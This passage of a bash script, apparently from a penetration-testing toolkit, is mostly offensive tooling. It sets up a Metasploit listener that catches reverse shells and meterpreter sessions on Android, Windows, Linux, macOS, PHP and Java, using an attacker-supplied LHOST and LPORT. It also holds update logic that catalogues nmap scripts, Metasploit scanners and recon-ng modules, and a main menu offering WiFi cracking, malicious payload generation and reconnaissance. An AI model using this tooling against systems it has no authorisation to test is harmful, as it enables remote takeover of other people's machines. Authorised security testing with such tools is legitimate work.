echo -e "\x1B[1;34mMetasploit Listeners\x1B[0m"
echo
echo "1.  android/meterpreter/reverse_tcp"
echo "2.  cmd/windows/reverse_powershell"
echo "3.  java/jsp_shell_reverse_tcp"
echo "4.  linux/x64/shell_reverse_tcp"
echo "5.  linux/x86/meterpreter/reverse_tcp"
echo "6.  osx/x64/shell_reverse_tcp"
echo "7.  php/meterpreter/reverse_tcp"
echo "8.  windows/meterpreter/reverse_tcp"
echo "9.  windows/x64/meterpreter/reverse_tcp"
echo "10. Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) payload="android/meterpreter/reverse_tcp";;
     2) payload="cmd/windows/reverse_powershell";;
     3) payload="java/jsp_shell_reverse_tcp";;
     4) payload="linux/x64/shell_reverse_tcp";;
     5) payload="linux/x86/meterpreter/reverse_tcp";;
     6) payload="osx/x64/shell_reverse_tcp";;
     7) payload="php/meterpreter/reverse_tcp";;
     8) payload="windows/meterpreter/reverse_tcp";;
     9) payload="windows/x64/meterpreter/reverse_tcp";;
     10) f_main;;
     *) f_error;;
esac

echo
echo -n "LHOST: "
read lhost

# Check for no answer
if [[ -z $lhost ]]; then
     lhost=$ip
     echo "Using $ip"
     echo
fi

echo -n "LPORT: "
read lport
echo

# Check for valid port number.
if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
     f_error
fi

# Check for root when binding to a low port
if [[ $lport -lt 1025 && "$(id -u)" != "0" ]]; then
     echo "You must be root to bind to a port that low."
     sleep 3
     f_error
fi

cp $discover/resource/listener.rc /tmp/

# Check for OS X
if [[ `uname` == 'Darwin' ]]; then
     sed -i '' "s|aaa|$payload|g" /tmp/listener.rc
     sed -i '' "s/bbb/$lhost/g" /tmp/listener.rc
     sed -i '' "s/ccc/$lport/g" /tmp/listener.rc
else
     sed -i "s|aaa|$payload|g" /tmp/listener.rc
     sed -i "s/bbb/$lhost/g" /tmp/listener.rc
     sed -i "s/ccc/$lport/g" /tmp/listener.rc
fi

x=`ps aux | grep 'postgres' | grep -v 'grep'`

if [[ -z $x ]]; then
     echo
     service postgresql start
fi

$msf -r /tmp/listener.rc

echo
echo
exit
}

##############################################################################################################

f_updates(){
# Remove nmap scripts not being used
ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | egrep -v '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|clock-skew|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|fcrdns|fingerprint-strings|firewalk|firewall-bypass|ftp-libopie|ftp-libopie|ganglia-info|hnap-info|hostmap-bfk|hostmap-ip2hosts|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation|ipidseq|ipv6|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|metasploit-info|mmouse-exec|ms-sql-config|mrinfo|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-y-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|rusers|shodan-api|script|sip-call-spoof|skypev2-version|smb-flood|smb-ls|smb-print-text|smb-psexec|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-hostkey|ssh2-enum-algos|sshv1|stun-info|teamspeak2-version|targets|tftp-enum|tor-consensus-checker|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vtam-enum|vuln-cve|vuze-dht-info|weblogic-t3-info|whois|xmlrpc-methods|xmpp-info)' > tmp

grep 'script=' discover.sh | egrep -v '(discover.sh|22.txt|smtp.txt)' | cut -d '=' -f2- | cut -d ' ' -f1 | tr ',' '\n' | egrep -v '(db2-discover|dhcp-discover|dns-service-discovery|http-email-harvest|http-grep|membase-http-info|oracle-sid-brute|smb-os-discovery|tn3270-info)' | sort -u > tmp2

echo "New modules to be added." > tmp-updates
echo >> tmp-updates
echo >> tmp-updates
echo "Nmap scripts" >> tmp-updates
echo "==============================" >> tmp-updates

diff tmp tmp2 | egrep '^[<>]' | awk '{print $2}' | sed '/^$/d' | egrep -v '(clamav-exec|smb-vuln*|smtp-commands|smtp-enum-users|smtp-ntlm-info|smtp-open-relay|smtp-strangeport|smtp-vuln*|ssl*|tls-nextprotoneg|tmp)' >> tmp-updates

rm tmp

echo >> tmp-updates
echo >> tmp-updates
echo "Metasploit auxiliary/scanners" >> tmp-updates
echo "==============================" >> tmp-updates

# Not included: http sap

categories="afp backdoor chargen couchdb db2 dcerpc dect discovery emc finger ftp h323 imap ip ipmi lotus misc mongodb motorola msf mssql mysql natpmp nessus netbios nexpose nfs ntp openvas oracle pcanywhere pop3 portscan postgres printer rdp rogue rservices scada sip smb smtp snmp ssh telephony telnet tftp upnp vmware vnc voice vxworks winrm x11"

for i in $categories; do
     ls -l /usr/share/metasploit-framework/modules/auxiliary/scanner/$i | awk '{print $9}' | cut -d '.' -f1 >> tmp
done

sed '/^$/d' tmp > tmp2

# Remove Metasploit scanners not used
egrep -v '(ack|apache_karaf_command_execution|arp_sweep|call_scanner|cerberus_sftp_enumusers|couchdb_enum|dvr_config_disclosure|empty_udp|endpoint_mapper|ftpbounce|hidden|ipidseq|ipv6|login|lotus_domino_hashes|management|ms08_067_check|mysql_file_enum|mysql_hashdump|mysql_schemadump|mysql_writable_dirs|natpmp_portscan|poisonivy_control_scanner|profinet_siemens|psexec_loggedin_users|recorder|rogue_recv|rogue_send|sipdroid_ext_enum|snmp_set|ssh_enumusers|ssh_identify_pubkeys|station_scanner|syn|tcp|tftpbrute|udp_probe|udp_sweep|wardial|winrm_cmd|winrm_wql|xmas)' tmp2 | sort > tmp-msf-all

grep 'use ' $discover/resource/*.rc | grep -v 'recon-ng' > tmp

# Print from the last /, to the end of the line
sed -e 's:.*/\(.*\):\1:g' tmp > tmp-msf-used

grep -v -f tmp-msf-used tmp-msf-all >> tmp-updates

echo >> tmp-updates
echo >> tmp-updates

echo "recon-ng" >> tmp-updates
echo "==============================" >> tmp-updates
python /usr/share/recon-ng/recon-cli -M > tmp
grep '/' tmp | awk '{print $1}' | egrep -iv '(adobe|bozocrack|brute_suffix|cache_snoop|dev_diver|exploitation|freegeoip|fullcontact|gists_search|github_commits|github_dorks|github_repos|github_users|google_site_web|hashes_org|import|interesting_files|ipinfodb|jigsaw|linkedin_auth|locations|mailtester|mangle|metacrawler|migrate_contacts|migrate_hosts|namechk|profiler|pwnedlist|reporting|vulnerabilities)' > tmp2
cat $discover/resource/recon-ng.rc $discover/resource/recon-ng-active.rc | grep 'use' | grep -v 'query' | awk '{print $2}' | sort -u > tmp3
diff tmp2 tmp3 | grep '/' | egrep -v '(indeed|vpnhunter)' | awk '{print $2}' | sort -u >> tmp-updates

echo >> tmp-updates
echo >> tmp-updates

mv tmp-updates $home/data/updates.txt
rm tmp*

echo
echo $medium
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/updates.txt
echo
echo
exit
}

##############################################################################################################

f_main(){
clear
f_banner

if [ ! -d $home/data ]; then
     mkdir -p $home/data
fi

echo -e "\x1B[1;34mRECON\x1B[0m"    # In MacOS X, using \x1B instead of \e. \033 would be ok for all platforms.
echo "1.  Domain"
echo "2.  Person"
echo "3.  Parse salesforce"
echo
echo -e "\x1B[1;34mSCANNING\x1B[0m"
echo "4.  Generate target list"
echo "5.  CIDR"
echo "6.  List"
echo "7.  IP, range, or URL"
echo "8.  Rerun Nmap scripts and MSF aux."
echo
echo -e "\x1B[1;34mWEB\x1B[0m"
echo "9.  Insecure direct object reference"
echo "10. Open multiple tabs in $browser"
echo "11. Nikto"
echo "12. SSL"
echo
echo -e "\x1B[1;34mMISC\x1B[0m"
echo "13. Crack WiFi"
echo "14. Parse XML"
echo "15. Generate a malicious payload"
echo "16. Start a Metasploit listener"
echo "17. Update"
echo "18. Exit"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_errorOSX; f_domain;;
     2) f_person;;
     3) f_salesforce;;
     4) f_generateTargetList;;
     5) f_cidr;;
     6) f_list;;
     7) f_single;;
     8) f_errorOSX; f_enumerate;;
     9) f_directObjectRef;;	 
     10) f_multitabs;;
     11) f_errorOSX; f_nikto;;
     12) f_errorOSX; f_ssl;;
     13) f_runlocally && $discover/crack-wifi.sh;;
     14) f_parse;;
     15) f_payload;;
     16) f_listener;;
     17) f_errorOSX; $discover/update.sh && exit;;
     18) clear && exit;;
     99) f_errorOSX; f_updates;;
     *) f_error;;
esac
}

##############################################################################################################

while true; do f_main; done
